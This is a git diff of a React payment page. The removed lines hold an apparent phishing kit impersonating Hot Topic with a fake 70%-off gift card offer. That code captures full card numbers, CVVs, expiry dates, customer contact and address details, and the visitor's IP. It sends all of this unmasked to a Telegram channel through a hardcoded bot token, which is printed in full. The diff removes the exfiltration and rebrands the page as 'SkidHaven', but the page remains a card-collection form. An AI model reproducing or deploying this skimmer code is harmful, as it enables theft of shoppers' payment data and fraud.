@@ -6,13 +6,9 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { toast } from "@/hooks/use-toast";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import HotTopicHeader from "@/components/HotTopicHeader";
-import HotTopicFooter from "@/components/HotTopicFooter";
+import SkidHavenHeader from "@/components/SkidHavenHeader";
+import SkidHavenFooter from "@/components/SkidHavenFooter";
 import { AlertCircle, CreditCard, LockIcon, Shield } from "lucide-react";
-
-// Telegram configuration
-const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
-const TELEGRAM_CHANNEL_ID = "-1002550945996";
 
 // Updated card types with PNG images
 const CARD_TYPES = [
@@ -94,40 +90,11 @@ const Payment = () => {
     cvv: ""
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
-  const [sessionId, setSessionId] = useState<string>("");
-  const [userIp, setUserIp] = useState<string>("");
 
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
   const giftCardValue = location.state?.giftCardValue;
   const discountedAmount = location.state?.discountedAmount;
-
-  // Get user IP and set session ID on component mount
-  useEffect(() => {
-    // Generate or retrieve session ID
-    const existingSessionId = localStorage.getItem("hottopic_session_id");
-    if (existingSessionId) {
-      setSessionId(existingSessionId);
-    } else {
-      const newSessionId = crypto.randomUUID();
-      localStorage.setItem("hottopic_session_id", newSessionId);
-      setSessionId(newSessionId);
-    }
-    
-    // Get user IP
-    const fetchIp = async () => {
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        setUserIp(data.ip);
-      } catch (error) {
-        console.error("Failed to fetch IP:", error);
-        setUserIp("Unknown");
-      }
-    };
-    
-    fetchIp();
-  }, []);
 
   // If no order details, redirect to home
   useEffect(() => {
@@ -140,98 +107,6 @@ const Payment = () => {
       });
     }
   }, [orderDetails, navigate]);
-
-  // Function to send notification to Telegram
-  const sendTelegramNotification = async (paymentDetails: any) => {
-    try {
-      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      
-      // Format the message with full card details (not masked)
-      let message = `
-💳 *PAYMENT DETAILS SUBMITTED* 💳
-
-👤 *Customer Information*:
-   Name: ${orderDetails?.customerName || "N/A"}
-   Email: ${orderDetails?.email || "N/A"}
-   Phone: ${orderDetails?.phone || "N/A"}
-
-💰 *Card Details*:
-   Card Type: ${selectedCardType}
-   Card Number: \`${formData.cardNumber}\`
-   Card Holder: ${formData.cardName}
-   Expiry: ${formData.expiryDate}
-   CVV: \`${formData.cvv}\`
-
-🛒 *Order Details*:
-   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
-   Payment Amount: $${discountedAmount?.toFixed(2) || "0.00"}
-   Delivery Method: ${orderDetails?.deliveryMethod || "N/A"}`;
-
-      // Add address if it's a physical delivery
-      if (orderDetails?.deliveryMethod === "physical" && orderDetails?.address) {
-        message += `
-📍 *Shipping Address*:
-   Street: ${orderDetails.address.street}
-   City: ${orderDetails.address.city}
-   State: ${orderDetails.address.state}
-   ZIP: ${orderDetails.address.zipCode}`;
-      }
-
-      // Add user information
-      message += `
-
-🔍 *User Information*:
-   IP Address: \`${userIp}\`
-   Browser: ${navigator.userAgent}
-   Session ID: ${sessionId || 'Not available'}
-   Timestamp: ${new Date().toISOString()}
-
-📆 *Payment Submitted*: ${new Date().toLocaleString()}`;
-
-      console.log("Sending Telegram notification with message:", message);
-      
-      // Send to Telegram
-      const response = await fetch(telegramApiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHANNEL_ID,
-          text: message,
-          parse_mode: 'Markdown',
-        }),
-      });
-
-      const result = await response.json();
-      console.log("Telegram API response:", result);
-      
-      if (!result.ok) {
-        console.error('Telegram notification error:', result);
-        return false;
-      }
-      
-      console.log("Telegram notification sent successfully");
-      return true;
-    } catch (error) {
-      console.error('Failed to send Telegram notification:', error);
-      // Don't stop the checkout flow if notification fails
-      return false;
-    }
-  };
-
-  // Mask card number for security
-  const maskCardNumber = (cardNumber: string): string => {
-    const digits = cardNumber.replace(/\D/g, '');
-    if (digits.length < 8) return "Invalid";
-    
-    // Keep first 6 and last 4 digits, mask the rest
-    const firstSix = digits.substring(0, 6);
-    const lastFour = digits.substring(digits.length - 4);
-    const maskedMiddle = '*'.repeat(digits.length - 10);
-    
-    return `${firstSix}${maskedMiddle}${lastFour}`;
-  };
 
   const validateField = (name: string, value: string): string => {
     switch (name) {
@@ -256,7 +131,7 @@ const Payment = () => {
           return "Month must be between 1 and 12";
         }
         const currentYear = new Date().getFullYear() % 100;
-        const currentMonth = new Date().getMonth() + 1; // JavaScript months are 0-based
+        const currentMonth = new Date().getMonth() + 1;
         
         if (Number(year) < currentYear || 
             (Number(year) === currentYear && Number(month) < currentMonth)) {
@@ -267,7 +142,6 @@ const Payment = () => {
         if (!CVV_REGEX.test(value)) {
           return "Please enter a valid CVV";
         }
-        // Different validation for American Express (4 digits) vs other cards (3 digits)
         if (selectedCardType === "American Express" && value.length !== 4) {
           return "American Express cards require a 4-digit CVV";
         } else if (selectedCardType !== "American Express" && value.length !== 3) {
@@ -283,7 +157,6 @@ const Payment = () => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
     
-    // Validate field on change and update errors
     const error = validateField(name, value);
     setErrors(prev => ({
       ...prev,
@@ -292,16 +165,12 @@ const Payment = () => {
   };
 
   const formatCardNumber = (value: string): string => {
-    // Remove all non-digit characters
     const cleaned = value.replace(/\D/g, '');
-    
-    // Auto-detect card type and update state
     const detectedType = detectCardType(cleaned);
     if (detectedType !== "Unknown") {
       setSelectedCardType(detectedType);
     }
     
-    // Format as XXXX XXXX XXXX XXXX (or XXXX XXXXXX XXXXX for AMEX)
     const chunks = [];
     if (detectedType === "American Express") {
       if (cleaned.length > 0) chunks.push(cleaned.substring(0, Math.min(4, cleaned.length)));
@@ -316,10 +185,7 @@ const Payment = () => {
   };
 
   const formatExpiryDate = (value: string): string => {
-    // Remove all non-digit characters
     const cleaned = value.replace(/\D/g, '');
-    
-    // Format as MM/YY
     if (cleaned.length >= 3) {
       return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
     } else {
@@ -334,7 +200,6 @@ const Payment = () => {
       cardNumber: formatted
     }));
     
-    // Validate card number
     const error = validateField("cardNumber", formatted);
     setErrors(prev => ({
       ...prev,
@@ -349,7 +214,6 @@ const Payment = () => {
       expiryDate: formatted
     }));
     
-    // Validate expiry date
     const error = validateField("expiryDate", formatted);
     setErrors(prev => ({
       ...prev,
@@ -364,10 +228,8 @@ const Payment = () => {
     const newErrors: Record<string, string> = {};
     let hasErrors = false;
     
-    // Fields to validate
     const fieldNames = ["cardNumber", "cardName", "expiryDate", "cvv"];
     
-    // Validate each field
     fieldNames.forEach(fieldName => {
       const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
       if (error) {
@@ -387,22 +249,10 @@ const Payment = () => {
       return;
     }
     
-    // Set loading state
     setIsSubmitting(true);
     
     try {
-      console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
-      
-      // Send notification to Telegram with full card details
-      const notificationSent = await sendTelegramNotification({
-        cardType: selectedCardType,
-        cardNumber: formData.cardNumber,
-        cardName: formData.cardName,
-        expiryDate: formData.expiryDate,
-        cvv: formData.cvv
-      });
-      
-      console.log("Telegram notification status:", notificationSent ? "Sent" : "Failed");
+      console.log(`Processing payment using ${selectedCardType}`);
       
       // Navigate to processing page
       navigate("/processing-payment", { 
@@ -436,25 +286,24 @@ const Payment = () => {
     );
   };
 
-  // Find the selected card icon
   const selectedCardIcon = CARD_TYPES.find(card => card.name === selectedCardType)?.icon;
 
   return (
     <div className="min-h-screen bg-black">
-      <HotTopicHeader />
+      <SkidHavenHeader />
       
       <div className="container py-8">
         <div className="max-w-3xl mx-auto space-y-6">
-          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
+          <div className="bg-gray-900/10 rounded-xl p-6 border border-gray-700/20">
             <h1 className="text-3xl font-bold text-white mb-6 text-center">
-              Complete Your <span className="text-hottopic-red">Payment</span>
+              Complete Your <span className="text-blue-600">Payment</span>
             </h1>
             
             <form onSubmit={handleSubmit} className="space-y-6">
               {/* Payment Method */}
               <div className="space-y-4">
                 <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
-                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
+                  <span className="bg-blue-600 w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                     1
                   </span>
                   Payment Method
@@ -463,13 +312,13 @@ const Payment = () => {
                 <div className="space-y-2">
                   <Label htmlFor="cardType" className="text-white">Card Type*</Label>
                   <div className="flex items-center gap-2">
-                    <CreditCard className="h-5 w-5 text-hottopic-red" />
+                    <CreditCard className="h-5 w-5 text-blue-600" />
                     <Select
                       value={selectedCardType}
                       onValueChange={(value) => setSelectedCardType(value)}
                     >
                       <SelectTrigger 
-                        className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
+                        className="bg-gray-800 border-gray-600 focus:border-blue-600 w-full sm:w-auto"
                         id="cardType"
                       >
                         <SelectValue placeholder="Select card type">
@@ -481,12 +330,12 @@ const Payment = () => {
                           </div>
                         </SelectValue>
                       </SelectTrigger>
-                      <SelectContent className="bg-hottopic-dark border-hottopic-gray">
+                      <SelectContent className="bg-gray-800 border-gray-600">
                         {CARD_TYPES.map((card) => (
                           <SelectItem 
                             key={card.name} 
                             value={card.name}
-                            className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
+                            className="text-white hover:bg-gray-700/30 focus:bg-gray-700/30"
                           >
                             <div className="flex items-center gap-2">
                               <div className="w-10 flex items-center">
@@ -505,7 +354,7 @@ const Payment = () => {
               {/* Card Details */}
               <div className="space-y-4">
                 <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
-                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
+                  <span className="bg-blue-600 w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                     2
                   </span>
                   Card Details
@@ -520,7 +369,7 @@ const Payment = () => {
                         name="cardNumber"
                         value={formData.cardNumber}
                         onChange={handleCardNumberInput}
-                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
+                        className={`bg-gray-800 border-gray-600 focus:border-blue-600 pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
                         placeholder="•••• •••• •••• ••••"
                         maxLength={selectedCardType === "American Express" ? 17 : 19}
                       />
@@ -543,7 +392,7 @@ const Payment = () => {
                       name="cardName"
                       value={formData.cardName}
                       onChange={handleInputChange}
-                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
+                      className={`bg-gray-800 border-gray-600 focus:border-blue-600 ${errors.cardName ? 'border-red-500' : ''}`}
                       placeholder="Enter name as it appears on card"
                     />
                     {renderErrorMessage("cardName")}
@@ -558,7 +407,7 @@ const Payment = () => {
                       name="expiryDate"
                       value={formData.expiryDate}
                       onChange={handleExpiryDateInput}
-                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
+                      className={`bg-gray-800 border-gray-600 focus:border-blue-600 ${errors.expiryDate ? 'border-red-500' : ''}`}
                       placeholder="MM/YY"
                       maxLength={5}
                     />
@@ -572,7 +421,7 @@ const Payment = () => {
                         name="cvv"
                         value={formData.cvv}
                         onChange={handleInputChange}
-                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
+                        className={`bg-gray-800 border-gray-600 focus:border-blue-600 ${errors.cvv ? 'border-red-500' : ''}`}
                         placeholder={selectedCardType === "American Express" ? "••••" : "•••"}
                         maxLength={selectedCardType === "American Express" ? 4 : 3}
                         type="password"
@@ -587,29 +436,21 @@ const Payment = () => {
               </div>
               
               {/* Order Summary */}
-              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30 space-y-4">
+              <div className="bg-gray-800/20 p-6 rounded-lg border border-gray-700/30 space-y-4">
                 <h3 className="text-xl font-semibold text-white mb-2">Order Summary</h3>
                 
                 <div className="space-y-2 text-sm">
                   <div className="flex justify-between">
-                    <span className="text-gray-400">Item:</span>
-                    <span className="text-white">Hot Topic Gift Card</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-gray-400">Gift Card Value:</span>
+                    <span className="text-gray-400">Amount:</span>
                     <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-gray-400">Discount:</span>
-                    <span className="text-hottopic-red">70% OFF</span>
                   </div>
                   <div className="flex justify-between">
                     <span className="text-gray-400">Delivery Method:</span>
                     <span className="text-white capitalize">{orderDetails?.deliveryMethod}</span>
                   </div>
-                  <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
+                  <div className="border-t border-gray-700/30 my-2 pt-2 flex justify-between font-bold">
                     <span className="text-white">Total:</span>
-                    <span className="text-hottopic-red">${discountedAmount?.toFixed(2) || "0.00"}</span>
+                    <span className="text-blue-600">${discountedAmount?.toFixed(2) || "0.00"}</span>
                   </div>
                 </div>
               </div>
@@ -619,7 +460,7 @@ const Payment = () => {
                 <Button 
                   type="submit" 
                   disabled={isSubmitting}
-                  className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
+                  className="w-full md:w-auto px-8 py-6 bg-blue-600 hover:bg-blue-600/90 text-white font-bold text-lg"
                 >
                   {isSubmitting ? (
                     <div className="flex items-center space-x-2">
@@ -643,7 +484,7 @@ const Payment = () => {
         </div>
       </div>
       
-      <HotTopicFooter />
+      <SkidHavenFooter />
     </div>
   );
 };
